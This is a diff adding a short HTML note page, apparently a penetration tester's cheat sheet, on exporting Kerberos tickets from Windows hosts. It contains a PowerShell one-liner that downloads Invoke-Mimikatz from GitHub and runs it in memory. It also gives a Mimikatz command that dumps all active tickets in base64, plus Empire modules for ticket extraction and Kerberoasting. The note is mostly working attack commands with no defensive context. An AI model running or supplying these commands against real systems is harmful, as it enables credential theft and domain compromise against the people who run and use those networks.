@@ -1,0 +1,18 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Exporting Tickets</title>
+</head><body><b>Exporting Tickets</b><br/>
+Mimikatz<br/>
+kerberos::list /export is awesome, but will generate a file per-ticket. Can use base64 mode with mimikatz to export all of the artive tickets and exit<br/>
+<br/>
+IEX (New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&quot;)<br/>
+Invoke-Mimikatz -Command 'standard::base64 &quot;kerberos::list /export&quot; exit'<br/>
+<br/>
+Empire<br/>
+usemodule credentials/mimikatz/extract_tickets<br/>
+run<br/>
+<br/>
+powershell/credentials/invoke_kerberoast <br/>
+<img src="image.png"/><br/>
+</body></html>
